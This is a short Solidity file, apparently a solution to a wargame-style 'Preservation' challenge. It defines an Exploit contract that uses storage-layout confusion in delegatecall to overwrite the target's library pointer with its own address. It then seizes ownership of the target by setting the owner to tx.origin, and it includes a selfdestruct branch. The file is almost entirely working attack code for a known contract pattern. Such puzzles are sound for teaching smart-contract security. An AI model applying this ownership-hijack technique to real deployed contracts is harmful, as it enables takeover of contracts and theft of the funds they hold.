// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Exploit {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function pwn(Preservation target) public {
        // this will actually set target timeZone1Library to this due to storage layout confusion.
        target.setSecondTime(uint160(address(this)));
        // now the target delegatecalls into us.
        target.setFirstTime(uint160(tx.origin));
    }

    function setTime(uint256 _time) public {
        // this is our callback when setFirstTime is called.
        if (_time != 0) {
            owner = address(uint160(_time));
        } else {
            // for the flex
            selfdestruct(payable(owner));
        }
    }
}
